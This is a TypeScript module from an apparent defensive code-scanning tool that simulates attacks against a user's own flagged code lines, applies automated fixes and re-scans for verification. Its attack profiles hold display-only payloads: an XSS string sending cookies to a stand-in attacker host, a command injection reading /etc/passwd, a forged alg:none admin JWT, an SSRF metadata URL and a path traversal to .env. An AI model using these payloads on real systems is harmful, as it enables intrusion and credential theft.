/**
 * Sentinel AI — File-Targeted Attack Simulation Engine.
 *
 * Drives before-vs-after attack simulations from the vulnerabilities detected in
 * the user's own code:
 *   1. Locates the real vulnerable line (including inside combined .zip previews).
 *   2. Traces the tainted input feeding that line (req.query.x, f-string args, etc.).
 *   3. Renders a simulated payload into that exact line to show what would execute.
 *   4. Applies the real automated fix from the Secure Fix Engine.
 *   5. Re-scans the hardened code to verify whether the attack is truly blocked.
 *
 * SAFETY: payloads are only rendered as display strings. Nothing is executed,
 * evaluated, or sent over the network.
 */

import { analyzeCode, type StructuredVulnerability } from "@/security/analyzer";
import { defaultSecureFixEngine } from "@/security/fixes";
import type {
  FileAttackFrame,
  FileAttackNode,
  FileAttackRunResponse,
  FileAttackSimulation,
  FileAttackType,
  FileAttackVerdict,
  FileCodeLine,
} from "@/types/file-attack.types";
import type { SupportedLanguage } from "@/types/security.types";

export const FILE_ATTACK_DISCLAIMER =
  "100% SIMULATED: Payloads are rendered into your code as text only to demonstrate impact. No code is executed, no network requests are made, and no real systems are attacked.";

const MAX_SIMULATIONS = 30;

interface AttackProfile {
  attackName: string;
  mitreTechnique: string;
  sink: string;
  sinkNodeLabel: string;
  assetLabel: string;
  payload: (input: string | null) => string;
  impact: (ctx: ProfileContext) => string;
  assets: (ctx: ProfileContext) => string[];
  defense: string;
  reattackBlocked: (ctx: ProfileContext) => string;
  steps: (ctx: ProfileContext) => string[];
}

interface ProfileContext {
  fileName: string;
  line: number;
  input: string | null;
  payload: string;
  lineText: string;
}

/* -------------------------------------------------------------------------- */
/* Attack type classification                                                 */
/* -------------------------------------------------------------------------- */

function classifyAttackType(vuln: StructuredVulnerability): FileAttackType {
  const hay = `${vuln.ruleId} ${vuln.name} ${vuln.category} ${vuln.cweId}`.toLowerCase();

  if (/sqli|sql|cwe-89\b|nosql|cwe-943/.test(hay)) return "sql-injection";
  if (/cmdi|command|child-process|subprocess|shell|cwe-78\b/.test(hay))
    return "command-injection";
  if (/eval|new function|code-injection|cwe-95\b|cwe-94\b|pickle|deserial/.test(hay))
    return "code-injection";
  if (/xss|cross.site|dangerouslysetinnerhtml|innerhtml|cwe-79\b/.test(hay))
    return "xss";
  if (/ssrf|cwe-918/.test(hay)) return "ssrf";
  if (/path|traversal|cwe-22\b/.test(hay)) return "path-traversal";
  if (/authz|authorization|privilege|rbac|cwe-862|cwe-269|cwe-285/.test(hay))
    return "privilege-escalation";
  if (/pkg|package|outdated|dependency|cwe-1104|cwe-1035/.test(hay))
    return "supply-chain";
  if (/env|exposed|cwe-200|db-001|database connection|open database/.test(hay))
    return "data-exposure";
  if (/key|secret|password|pwd|token|credential|private key|cwe-798|cwe-259|cwe-321/.test(hay))
    return "api-key-theft";
  if (/auth|jwt|session|cookie|cwe-287|cwe-347|cwe-614|md5|sha1|cwe-328/.test(hay))
    return "broken-authentication";
  if (vuln.category === "injection") return "sql-injection";
  if (vuln.category === "secrets") return "api-key-theft";
  return "data-exposure";
}

/* -------------------------------------------------------------------------- */
/* Code location + taint helpers                                              */
/* -------------------------------------------------------------------------- */

function normalizeWs(text: string): string {
  return text.replace(/\s+/g, " ").trim();
}

/** Extracts the highlighted (">") line text from an engine snippet, if present. */
function extractMarkedSnippetLine(snippet: string): string | null {
  for (const raw of snippet.split("\n")) {
    const match = /^>\s*\d+\s*\|\s?(.*)$/.exec(raw);
    if (match && match[1] !== undefined) {
      return match[1];
    }
  }
  return null;
}

/**
 * Resolves the 1-based line in `lines` for a vulnerability.
 * Handles combined .zip previews (findings named "[path/to/file] ...") by
 * offsetting from the "// ==== path ====" section header, then confirms using
 * the snippet's marked line text when available.
 */
function resolveTargetLine(
  vuln: StructuredVulnerability,
  lines: readonly string[]
): number {
  let sectionStart = 0;
  let sectionEnd = lines.length;
  const pathMatch = /^\[([^\]]+)\]\s/.exec(vuln.name);
  if (pathMatch && pathMatch[1]) {
    const header = `// ==================== ${pathMatch[1]} ====================`;
    const headerIndex = lines.findIndex((l) => l.trim() === header);
    if (headerIndex >= 0) {
      sectionStart = headerIndex + 1;
      const nextHeaderOffset = lines
        .slice(sectionStart)
        .findIndex((l) => l.trim().startsWith("// ===================="));
      if (nextHeaderOffset >= 0) {
        sectionEnd = sectionStart + nextHeaderOffset;
      }
    }
  }

  const candidate = Math.min(
    Math.max(1, sectionStart + vuln.fileLine),
    Math.max(1, sectionEnd)
  );

  const marked = extractMarkedSnippetLine(vuln.snippet);
  if (marked && normalizeWs(marked).length > 0) {
    const want = normalizeWs(marked);
    const candidateText = lines[candidate - 1];
    if (candidateText !== undefined && normalizeWs(candidateText) === want) {
      return candidate;
    }
    // Search nearest matching line strictly within this file's section.
    let best = -1;
    let bestDist = Number.POSITIVE_INFINITY;
    for (let idx = sectionStart; idx < sectionEnd; idx += 1) {
      const l = lines[idx];
      if (l !== undefined && normalizeWs(l) === want) {
        const dist = Math.abs(idx + 1 - candidate);
        if (dist < bestDist) {
          best = idx + 1;
          bestDist = dist;
        }
      }
    }
    if (best > 0) return best;
  }

  return candidate;
}

function buildContextLines(
  lines: readonly string[],
  targetLine: number,
  radius = 3
): FileCodeLine[] {
  const start = Math.max(1, targetLine - radius);
  const end = Math.min(lines.length, targetLine + radius);
  const result: FileCodeLine[] = [];
  for (let n = start; n <= end; n += 1) {
    result.push({
      lineNumber: n,
      text: lines[n - 1] ?? "",
      highlighted: n === targetLine,
    });
  }
  return result;
}

/** Finds the user-controlled expression flowing into the vulnerable line. */
function extractTaintedInput(lineText: string): string | null {
  const patterns: RegExp[] = [
    /\$\{\s*([^}]+?)\s*\}/, // JS template literal interpolation
    /\b((?:req|request|ctx|event)\.(?:query|body|params|args|form|json|cookies|headers|get_json\(\))(?:\.[A-Za-z_$][\w$]*|\[['"][^'"]+['"]\])*)/,
    /\+\s*([A-Za-z_$][\w$.]*(?:\[[^\]]+\])?)/, // string concatenation
    /\.(?:innerHTML|outerHTML)\s*=\s*([^;]+)/,
    /__html\s*:\s*([^}]+)/,
    /\b(?:eval|exec|execSync|system|Function|setTimeout|setInterval|popen|run|call|Popen)\s*\(\s*(?:f?["'`][^"'`]*["'`]\s*[,+%]\s*)?([A-Za-z_$][\w$.]*)/,
    /f["'][^"']*\{\s*([^}]+?)\s*\}/, // Python f-string
    /\.format\(\s*([^)]+)\)/,
    /%\s*\(?\s*([A-Za-z_][\w.]*)/,
  ];

  for (const pattern of patterns) {
    const match = pattern.exec(lineText);
    const value = match?.[1]?.trim();
    if (value && value.length > 0 && value.length <= 80) {
      return value.replace(/[;,)\s]+$/, "");
    }
  }
  return null;
}

function describeEntryPoint(input: string | null): string {
  if (!input) return "Application input reaching this line";
  const key = /\.(\w+)$/.exec(input)?.[1] ?? input;
  if (/\.(query|args)\b/.test(input)) return `URL query parameter "${key}"`;
  if (/\.(body|json|form|get_json)/.test(input)) return `Request body field "${key}"`;
  if (/\.params\b/.test(input)) return `URL path segment "${key}"`;
  if (/\.headers\b/.test(input)) return `HTTP header "${key}"`;
  if (/\.cookies\b/.test(input)) return `Cookie "${key}"`;
  return `User-controlled value \`${input}\``;
}

function escapeRegExp(text: string): string {
  return text.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/** Renders the simulated payload into the actual vulnerable line (display only). */
function renderExploitedLine(
  lineText: string,
  input: string | null,
  payload: string
): string {
  if (!input) {
    return `${lineText.trim()}   // ← attacker supplies: ${payload}`;
  }
  const interpolation = new RegExp(`\\$\\{\\s*${escapeRegExp(input)}\\s*\\}`, "g");
  if (interpolation.test(lineText)) {
    return lineText.replace(interpolation, payload).trim();
  }
  const pyInterp = new RegExp(`\\{\\s*${escapeRegExp(input)}\\s*\\}`, "g");
  if (/f["']/.test(lineText) && pyInterp.test(lineText)) {
    return lineText.replace(pyInterp, payload).trim();
  }
  const token = new RegExp(`(^|[^\\w$.])${escapeRegExp(input)}(?![\\w$])`);
  if (token.test(lineText)) {
    return lineText
      .replace(token, (_m, pre: string) => `${pre}${JSON.stringify(payload)}`)
      .trim();
  }
  return `${lineText.trim()}   // ← ${input} = ${JSON.stringify(payload)}`;
}

/** Extracts the effective string the sink would receive after payload injection. */
function resolveExecutedString(exploitedLine: string): string {
  const backtick = /`([^`]*)`/.exec(exploitedLine);
  if (backtick?.[1]) return backtick[1];
  const fstring = /f["']([^"']*)["']/.exec(exploitedLine);
  if (fstring?.[1]) return fstring[1];
  return exploitedLine;
}

function detectSecretKind(lineText: string): string {
  if (/sk_live_|sk_test_|rk_live_/.test(lineText)) return "Stripe secret key";
  if (/AKIA[0-9A-Z]{8,}/.test(lineText)) return "AWS access key";
  if (/\bsk-[A-Za-z0-9_-]{8,}/.test(lineText)) return "OpenAI/LLM API key";
  if (/gh[pousr]_[A-Za-z0-9]{8,}/.test(lineText)) return "GitHub token";
  if (/AIza[0-9A-Za-z_-]{10,}/.test(lineText)) return "Google API key";
  if (/xox[baprs]-/.test(lineText)) return "Slack token";
  if (/PRIVATE KEY/.test(lineText)) return "private cryptographic key";
  if (/jwt|secret/i.test(lineText)) return "JWT signing secret";
  if (/pass(word)?|pwd/i.test(lineText)) return "hardcoded password";
  if (/:\/\/[^:\s]+:[^@\s]+@/.test(lineText)) return "database credential";
  return "hardcoded credential";
}

function redactSecretsInLine(lineText: string): string {
  return lineText.replace(
    /(["'`])([A-Za-z0-9_\-+/=.:@]{12,})\1/g,
    (_m, q: string, secret: string) =>
      `${q}${secret.slice(0, 4)}…${secret.slice(-3)}${q}`
  );
}

/* -------------------------------------------------------------------------- */
/* Attack profiles                                                            */
/* -------------------------------------------------------------------------- */

const PROFILES: Record<FileAttackType, AttackProfile> = {
  "sql-injection": {
    attackName: "SQL Injection",
    mitreTechnique: "T1190 – Exploit Public-Facing Application",
    sink: "Database query engine",
    sinkNodeLabel: "Database",
    assetLabel: "All table rows",
    payload: () => "' OR '1'='1' --",
    impact: (c) =>
      `The payload breaks out of the string literal on ${c.fileName}:${c.line}. The tautology '1'='1' makes the WHERE clause always true, so the query returns every row (and could be extended with UNION SELECT or DROP).`,
    assets: () => [
      "Every row in the queried table",
      "Authentication bypass if used in login",
      "Database integrity (stacked queries)",
    ],
    defense: "Parameterized query / prepared statement ($1 placeholder)",
    reattackBlocked: (c) =>
      `Payload is bound as a parameter value: WHERE … = $1 with $1 = ${JSON.stringify(c.payload)}. It is compared as plain text, matches 0 rows, and no SQL syntax is executed.`,
    steps: (c) => [
      `Recon: attacker finds the endpoint feeding ${c.input ?? "user input"}.`,
      `Inject: sends ${c.payload} as the value.`,
      `Execution: ${c.fileName}:${c.line} concatenates it straight into SQL.`,
      "Impact: database returns all rows to the attacker.",
    ],
  },
  "command-injection": {
    attackName: "OS Command Injection",
    mitreTechnique: "T1059 – Command and Scripting Interpreter",
    sink: "Operating system shell",
    sinkNodeLabel: "OS Shell",
    assetLabel: "Server host",
    payload: () => "report.txt; cat /etc/passwd #SIMULATED",
    impact: (c) =>
      `The shell interprets ";" on ${c.fileName}:${c.line} as a command separator, so the attacker's second command runs with the app's privileges — full remote code execution.`,
    assets: () => [
      "Server filesystem (/etc/passwd, .env, keys)",
      "Remote code execution on the host",
      "Lateral movement into internal network",
    ],
    defense: "execFile/spawn with argument array and shell: false",
    reattackBlocked: (c) =>
      `With execFile(cmd, [arg], { shell: false }) the whole string ${JSON.stringify(c.payload)} is passed as ONE literal argument. No shell parses ";", so no second command runs.`,
    steps: (c) => [
      `Recon: attacker controls ${c.input ?? "a command argument"}.`,
      `Inject: appends a shell metacharacter payload.`,
      `Execution: ${c.fileName}:${c.line} hands the string to a shell.`,
      "Impact: arbitrary commands execute on the server.",
    ],
  },
  "code-injection": {
    attackName: "Code Injection via Dynamic Evaluation",
    mitreTechnique: "T1059.007 – JavaScript Execution",
    sink: "Language runtime (eval / Function / exec)",
    sinkNodeLabel: "JS/Py Runtime",
    assetLabel: "Process memory & secrets",
    payload: () => "process.env /* SIMULATED_EXFIL */",
    impact: (c) =>
      `${c.fileName}:${c.line} evaluates attacker text as code. The payload reads process.env (all secrets) and could just as easily spawn processes or modify data.`,
    assets: () => [
      "All environment secrets (process.env)",
      "Arbitrary code execution in the app process",
      "Application data and sessions",
    ],
    defense: "JSON.parse / safe parser / allowlisted dispatch instead of eval",
    reattackBlocked: (c) =>
      `JSON.parse(${JSON.stringify(c.payload)}) throws a SyntaxError — the input is treated as data, never as executable code.`,
    steps: (c) => [
      `Recon: attacker finds input reaching eval-like call (${c.input ?? "user data"}).`,
      "Inject: submits a JavaScript/Python expression.",
      `Execution: ${c.fileName}:${c.line} evaluates it as code.`,
      "Impact: secrets exfiltrated, arbitrary logic executed.",
    ],
  },
  xss: {
    attackName: "Cross-Site Scripting (XSS)",
    mitreTechnique: "T1189 – Drive-by Compromise",
    sink: "Victim's browser DOM",
    sinkNodeLabel: "Victim Browser",
    assetLabel: "Session cookies",
    payload: () => "<img src=x onerror=\"fetch('//attacker.invalid?c='+document.cookie)\">",
    impact: (c) =>
      `${c.fileName}:${c.line} writes the payload into the DOM as HTML. The broken image fires onerror and sends the victim's session cookie to the attacker — account takeover.`,
    assets: () => [
      "Victim session cookies / tokens",
      "Actions performed as the victim",
      "Page content (defacement, phishing)",
    ],
    defense: "textContent / escaped JSX or DOMPurify sanitization",
    reattackBlocked: () =>
      "Output is now rendered as inert text (or sanitized): the <img onerror> tag is displayed literally / stripped, no script runs, no cookie leaves the browser.",
    steps: (c) => [
      `Recon: attacker finds that ${c.input ?? "user content"} is rendered as HTML.`,
      "Plant: stores or links the malicious HTML payload.",
      `Execution: ${c.fileName}:${c.line} injects it into the page.`,
      "Impact: script runs in victim browser and steals session.",
    ],
  },
  "api-key-theft": {
    attackName: "Credential / API Key Theft",
    mitreTechnique: "T1552.001 – Credentials In Files",
    sink: "Source repository / client bundle",
    sinkNodeLabel: "Repo / Bundle",
    assetLabel: "Cloud & billing account",
    payload: () => "git log -p | grep -E 'sk_|AKIA|secret|password'  #SIMULATED",
    impact: (c) =>
      `A ${detectSecretKind(c.lineText)} is hardcoded on ${c.fileName}:${c.line}. Anyone with repo, bundle, or log access extracts it with a one-line search and authenticates directly as your application.`,
    assets: (c) => [
      `The ${detectSecretKind(c.lineText)} itself`,
      "Third-party account / billing abuse",
      "All data reachable with that credential",
    ],
    defense: "Secret moved to environment variable (process.env) + key rotation",
    reattackBlocked: () =>
      "The literal value no longer exists in source — searching the repo/bundle finds only process.env.<NAME>. Rotate the old key since it remains in git history.",
    steps: (c) => [
      "Recon: bots scan public repos and JS bundles for key patterns.",
      `Extract: secret pattern matched on ${c.fileName}:${c.line}.`,
      "Abuse: attacker calls the provider API with your credential.",
      "Impact: data access, financial abuse, account compromise.",
    ],
  },
  "broken-authentication": {
    attackName: "Broken Authentication / Token Forgery",
    mitreTechnique: "T1550 – Use Alternate Authentication Material",
    sink: "Authentication check",
    sinkNodeLabel: "Auth Layer",
    assetLabel: "Any user account",
    payload: () =>
      'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.  (alg:none, role:admin)',
    impact: (c) =>
      `${c.fileName}:${c.line} trusts identity data without a proper cryptographic check (unverified decode, weak hash, or insecure cookie). A forged/unsigned token claiming role "admin" is accepted.`,
    assets: () => [
      "Administrator account access",
      "Any user's identity (impersonation)",
      "Session integrity",
    ],
    defense: "jwt.verify with algorithm allowlist / strong hashing / secure cookies",
    reattackBlocked: () =>
      "jwt.verify(token, secret, { algorithms: ['HS256'] }) rejects the unsigned alg:none token with 401 Unauthorized — forged claims are never trusted.",
    steps: (c) => [
      "Recon: attacker captures or crafts a session token.",
      "Forge: edits claims to role=admin and strips the signature.",
      `Bypass: ${c.fileName}:${c.line} accepts the token without verifying.`,
      "Impact: attacker acts as administrator.",
    ],
  },
  "privilege-escalation": {
    attackName: "Privilege Escalation (Missing Authorization)",
    mitreTechnique: "T1068 – Exploitation for Privilege Escalation",
    sink: "Privileged operation",
    sinkNodeLabel: "Admin Action",
    assetLabel: "Other users' data",
    payload: () => 'PATCH /api/users/42  {"role":"admin"}  (no auth header)',
    impact: (c) =>
      `The handler around ${c.fileName}:${c.line} performs a sensitive operation without checking who the caller is or what role they have, so an anonymous request modifies privileged data.`,
    assets: () => [
      "Role / permission records",
      "Other tenants' data",
      "Administrative functions",
    ],
    defense: "Server-side auth + role (RBAC) guard and row-level security",
    reattackBlocked: () =>
      "requireAuth + role check rejects the request with 401/403 before the database is touched.",
    steps: (c) => [
      "Recon: attacker enumerates API routes.",
      "Request: calls the privileged route without credentials.",
      `Execution: ${c.fileName}:${c.line} runs with no authorization check.`,
      "Impact: attacker escalates to admin or edits others' data.",
    ],
  },
  ssrf: {
    attackName: "Server-Side Request Forgery (SSRF)",
    mitreTechnique: "T1552.005 – Cloud Instance Metadata API",
    sink: "Server-side HTTP client",
    sinkNodeLabel: "Internal Network",
    assetLabel: "Cloud credentials",
    payload: () => "http://169.254.169.254/latest/meta-data/iam/  #SIMULATED",
    impact: (c) =>
      `${c.fileName}:${c.line} fetches a URL the attacker controls, letting them reach internal services and cloud metadata endpoints from inside your network.`,
    assets: () => ["Cloud IAM credentials", "Internal admin services", "Private network"],
    defense: "Strict HTTPS host allowlist + private IP blocking",
    reattackBlocked: () =>
      "The allowlist rejects 169.254.169.254 (link-local) before any request is made.",
    steps: (c) => [
      `Recon: attacker controls ${c.input ?? "a URL parameter"}.`,
      "Inject: supplies an internal metadata URL.",
      `Execution: ${c.fileName}:${c.line} fetches it server-side.`,
      "Impact: cloud credentials returned to attacker.",
    ],
  },
  "path-traversal": {
    attackName: "Path Traversal",
    mitreTechnique: "T1083 – File and Directory Discovery",
    sink: "Filesystem API",
    sinkNodeLabel: "Filesystem",
    assetLabel: "Server files",
    payload: () => "../../../../.env",
    impact: (c) =>
      `${c.fileName}:${c.line} joins attacker input into a file path, so "../" sequences escape the intended folder and read secrets like .env.`,
    assets: () => [".env secrets", "Source code", "System files"],
    defense: "path.basename + resolved path must stay inside base directory",
    reattackBlocked: () =>
      "path.resolve + base-directory check rejects the escaped path with 400 Bad Request.",
    steps: (c) => [
      `Recon: attacker controls ${c.input ?? "a filename"}.`,
      "Inject: supplies ../ sequences.",
      `Execution: ${c.fileName}:${c.line} reads outside the folder.`,
      "Impact: secrets and source code disclosed.",
    ],
  },
  "data-exposure": {
    attackName: "Sensitive Data Exposure",
    mitreTechnique: "T1530 – Data from Cloud Storage / Config",
    sink: "Logs / client bundle / network",
    sinkNodeLabel: "Exposed Channel",
    assetLabel: "Secrets & configuration",
    payload: () => "view-source / DevTools → search 'NEXT_PUBLIC_' / read logs  #SIMULATED",
    impact: (c) =>
      `${c.fileName}:${c.line} exposes configuration or a connection that should stay private (public env var, logged env, unencrypted/public DB connection).`,
    assets: () => ["Environment secrets", "Database access", "Internal configuration"],
    defense: "Keep secrets server-only, never log env, enforce TLS & private binding",
    reattackBlocked: () =>
      "The secret is no longer shipped to the client or logs; the attacker's search finds nothing.",
    steps: (c) => [
      "Recon: attacker inspects client bundle, logs, or network.",
      `Discover: sensitive value exposed via ${c.fileName}:${c.line}.`,
      "Abuse: attacker uses the leaked configuration.",
      "Impact: backend services compromised.",
    ],
  },
  "supply-chain": {
    attackName: "Vulnerable Dependency Exploit",
    mitreTechnique: "T1195.001 – Compromise Software Dependencies",
    sink: "Third-party package code",
    sinkNodeLabel: "Vulnerable Package",
    assetLabel: "Application runtime",
    payload: () => "Public CVE exploit for the pinned version  #SIMULATED",
    impact: (c) =>
      `The dependency declared on ${c.fileName}:${c.line} has known public vulnerabilities; attackers use published exploits against every app still on that version.`,
    assets: () => ["Application runtime", "User data processed by the package"],
    defense: "Upgrade to patched version + lockfile + automated audits",
    reattackBlocked: () =>
      "Patched version removes the vulnerable code path; the public exploit no longer applies.",
    steps: (c) => [
      "Recon: attacker fingerprints package versions.",
      `Match: ${c.fileName}:${c.line} pins a vulnerable version.`,
      "Exploit: public CVE exploit is triggered.",
      "Impact: compromise through third-party code.",
    ],
  },
};

/* -------------------------------------------------------------------------- */
/* Animation builder                                                          */
/* -------------------------------------------------------------------------- */

function buildAnimation(
  profile: AttackProfile,
  ctx: ProfileContext,
  entryPoint: string,
  verdict: FileAttackVerdict
): FileAttackSimulation["animation"] {
  const nodes: FileAttackNode[] = [
    { id: "attacker", label: "Attacker", detail: "Untrusted actor", type: "attacker" },
    { id: "entry", label: "Entry Point", detail: entryPoint, type: "entry" },
    { id: "code", label: `${ctx.fileName}:${ctx.line}`, detail: "Your vulnerable line", type: "code" },
    { id: "sink", label: profile.sinkNodeLabel, detail: profile.sink, type: "sink" },
    { id: "asset", label: profile.assetLabel, detail: "Target asset", type: "asset" },
  ];

  const beforeFrames: FileAttackFrame[] = [
    { step: 1, timestampMs: 0, from: "attacker", to: "entry", label: `Sends payload via ${entryPoint}`, status: "info" },
    { step: 2, timestampMs: 1200, from: "entry", to: "code", label: `Payload reaches line ${ctx.line} unvalidated`, status: "warning" },
    { step: 3, timestampMs: 2400, from: "code", to: "sink", label: `Line ${ctx.line} passes payload to ${profile.sinkNodeLabel}`, status: "breach" },
    { step: 4, timestampMs: 3600, from: "sink", to: "asset", label: `${profile.assetLabel} compromised`, status: "breach" },
  ];

  const blocked = verdict === "blocked";
  const partial = verdict === "partially-mitigated";

  const afterFrames: FileAttackFrame[] = [
    { step: 1, timestampMs: 0, from: "attacker", to: "entry", label: "Same payload replayed", status: "info" },
    {
      step: 2,
      timestampMs: 1200,
      from: "entry",
      to: "code",
      label: blocked
        ? `Hardened line ${ctx.line}: ${profile.defense}`
        : partial
          ? `Line ${ctx.line} patched, but rule still fires`
          : `No automated fix — line ${ctx.line} unchanged`,
      status: blocked ? "blocked" : "warning",
    },
    {
      step: 3,
      timestampMs: 2400,
      from: "code",
      to: "sink",
      label: blocked ? "Payload treated as inert data" : "Payload still reaches sink",
      status: blocked ? "safe" : "breach",
    },
    {
      step: 4,
      timestampMs: 3600,
      from: "sink",
      to: "asset",
      label: blocked ? `${profile.assetLabel} protected` : `${profile.assetLabel} still at risk`,
      status: blocked ? "safe" : "breach",
    },
  ];

  return { durationMs: 4800, nodes, beforeFrames, afterFrames };
}

/* -------------------------------------------------------------------------- */
/* Engine                                                                     */
/* -------------------------------------------------------------------------- */

export interface FileAttackRunOptions {
  code: string;
  fileName: string;
  language?: SupportedLanguage;
  vulnerabilities?: StructuredVulnerability[];
}

export class FileTargetAttackSimulator {
  public run(options: FileAttackRunOptions): FileAttackRunResponse {
    const { code, fileName } = options;
    const lines = code.split(/\r?\n/);

    const baseline = analyzeCode(code, { fileName, language: options.language });
    const vulns =
      options.vulnerabilities && options.vulnerabilities.length > 0
        ? options.vulnerabilities
        : baseline.vulnerabilities;

    const simulations: FileAttackSimulation[] = [];
    const seen = new Set<string>();

    for (const vuln of vulns) {
      if (simulations.length >= MAX_SIMULATIONS) break;

      const attackType = classifyAttackType(vuln);
      const targetLine = resolveTargetLine(vuln, lines);
      const entryFile = /^\[([^\]]+)\]\s/.exec(vuln.name)?.[1] ?? fileName;
      const dedupeKey = `${entryFile}:${vuln.ruleId}:${vuln.fileLine}:${targetLine}`;
      if (seen.has(dedupeKey)) continue;
      seen.add(dedupeKey);

      simulations.push(
        this.simulateOne(
          vuln,
          attackType,
          targetLine,
          code,
          lines,
          entryFile,
          baseline.language
        )
      );
    }

    // Harden the whole file with every automated fix, then re-scan for the summary.
    const batch = defaultSecureFixEngine.generateBatchFix(
      code,
      vulns.map((v) => ({
        ruleId: v.ruleId,
        name: v.name,
        category: v.category,
        severity: v.severity,
        fileLine: resolveTargetLine(v, lines),
        cweId: v.cweId,
        description: v.description,
        language: baseline.language,
      }))
    );
    const hardened = analyzeCode(batch.secureCode, {
      fileName,
      language: options.language,
    });

    const blockedAfterFix = simulations.filter((s) => s.after.verdict === "blocked").length;
    const partiallyMitigated = simulations.filter(
      (s) => s.after.verdict === "partially-mitigated"
    ).length;
    const manualFixRequired = simulations.filter(
      (s) => s.after.verdict === "manual-fix-required"
    ).length;

    return {
      fileName,
      language: baseline.language,
      totalFindings: vulns.length,
      simulations,
      summary: {
        attacksLaunched: simulations.length,
        succeededBeforeFix: simulations.length,
        blockedAfterFix,
        partiallyMitigated,
        manualFixRequired,
        riskScoreBefore: baseline.riskScore,
        riskGradeBefore: baseline.riskGrade,
        riskScoreAfter: hardened.riskScore,
        riskGradeAfter: hardened.riskGrade,
        findingsBefore: baseline.vulnerabilities.length,
        findingsAfter: hardened.vulnerabilities.length,
      },
      hardenedCode: batch.secureCode,
      disclaimer: FILE_ATTACK_DISCLAIMER,
    };
  }

  private simulateOne(
    vuln: StructuredVulnerability,
    attackType: FileAttackType,
    targetLine: number,
    code: string,
    lines: readonly string[],
    fileName: string,
    language: SupportedLanguage
  ): FileAttackSimulation {
    const profile = PROFILES[attackType];
    const rawLineText = lines[targetLine - 1] ?? "";
    const isSecret = attackType === "api-key-theft" || attackType === "data-exposure";
    const lineText = isSecret ? redactSecretsInLine(rawLineText) : rawLineText;

    const taintedInput = isSecret ? null : extractTaintedInput(rawLineText);
    const payload = profile.payload(taintedInput);
    const entryPoint = isSecret
      ? "Source code / bundle access"
      : describeEntryPoint(taintedInput);
    const ctx: ProfileContext = {
      fileName,
      line: targetLine,
      input: taintedInput,
      payload,
      lineText: rawLineText,
    };

    const exploitedLine = isSecret
      ? `${lineText.trim()}   // ← extracted by attacker`
      : renderExploitedLine(rawLineText, taintedInput, payload);
    const resultingExecution = isSecret
      ? `Attacker obtains: ${detectSecretKind(rawLineText)} (value redacted here)`
      : resolveExecutedString(exploitedLine);

    // Apply the real automated fix for this specific finding.
    const fix = defaultSecureFixEngine.generateFix({
      originalCode: code,
      vulnerability: {
        ruleId: vuln.ruleId,
        name: vuln.name,
        category: vuln.category,
        severity: vuln.severity,
        fileLine: targetLine,
        cweId: vuln.cweId,
        description: vuln.description,
        language,
      },
    });

    // Verify by re-scanning the fixed code.
    let verdict: FileAttackVerdict = "manual-fix-required";
    let verification =
      "No automated fixer exists for this rule — the attack keeps succeeding until the recommended secure pattern below is applied manually.";

    const codeChanged = fix.applied && fix.secureCode !== code;
    if (codeChanged) {
      const beforeCount = analyzeCode(code, { fileName, language }).vulnerabilities.filter(
        (v) => v.ruleId === vuln.ruleId
      ).length;
      const afterScan = analyzeCode(fix.secureCode, { fileName, language });
      const afterSameRule = afterScan.vulnerabilities.filter(
        (v) => v.ruleId === vuln.ruleId
      );
      const fixedLines = fix.secureCode.split(/\r?\n/);
      const originalStillPresentAndFlagged = afterSameRule.some((v) => {
        const text = fixedLines[v.fileLine - 1];
        return text !== undefined && normalizeWs(text) === normalizeWs(rawLineText);
      });

      const isExternalRule = beforeCount === 0; // e.g. Semgrep rule ids
      if (!originalStillPresentAndFlagged && (isExternalRule || afterSameRule.length < beforeCount)) {
        verdict = "blocked";
        verification = `Re-scan of the hardened file: rule ${vuln.ruleId} no longer fires on line ${targetLine} (${beforeCount} → ${afterSameRule.length} occurrence${afterSameRule.length === 1 ? "" : "s"} in file).`;
      } else {
        verdict = "partially-mitigated";
        verification = `Fix applied, but re-scan still reports ${afterSameRule.length} ${vuln.ruleId} finding(s) — review the remaining occurrences.`;
      }
    }

    const blocked = verdict === "blocked";
    const fixedLines = fix.linesChanged.slice(0, 8).map((lc) => ({
      lineNumber: lc.lineNumber,
      originalLine: isSecret ? redactSecretsInLine(lc.originalLine) : lc.originalLine,
      updatedLine: lc.updatedLine,
    }));

    return {
      id: `${vuln.ruleId}-${targetLine}-${attackType}`,
      attackType,
      attackName: profile.attackName,
      ruleId: vuln.ruleId,
      vulnerabilityName: vuln.name,
      severity: vuln.severity,
      cweId: vuln.cweId,
      owaspCategory: vuln.owaspCategory,
      mitreTechnique: profile.mitreTechnique,
      target: {
        fileName,
        line: targetLine,
        lineText: lineText.trim(),
        contextLines: buildContextLines(lines, targetLine).map((cl) =>
          isSecret ? { ...cl, text: redactSecretsInLine(cl.text) } : cl
        ),
        taintedInput,
        entryPoint,
        sink: profile.sink,
      },
      attackPayload: payload,
      attackSteps: profile.steps(ctx),
      before: {
        success: true,
        exploitedLine,
        resultingExecution,
        impactSummary: profile.impact(ctx),
        compromisedAssets: profile.assets(ctx),
      },
      after: {
        verdict,
        blocked,
        fixApplied: codeChanged,
        fixSummary: fix.summary,
        fixedLines,
        reattackResult: blocked
          ? profile.reattackBlocked(ctx)
          : verdict === "partially-mitigated"
            ? "The patched code still contains a matching vulnerable pattern; the replayed payload may still succeed."
            : "Code is unchanged, so the replayed payload succeeds exactly as before.",
        defenseMechanism: profile.defense,
        verification,
        recommendedSecureCode: vuln.secureCodeExample,
      },
      animation: buildAnimation(profile, ctx, entryPoint, verdict),
    };
  }
}

export const defaultFileTargetAttackSimulator = new FileTargetAttackSimulator();
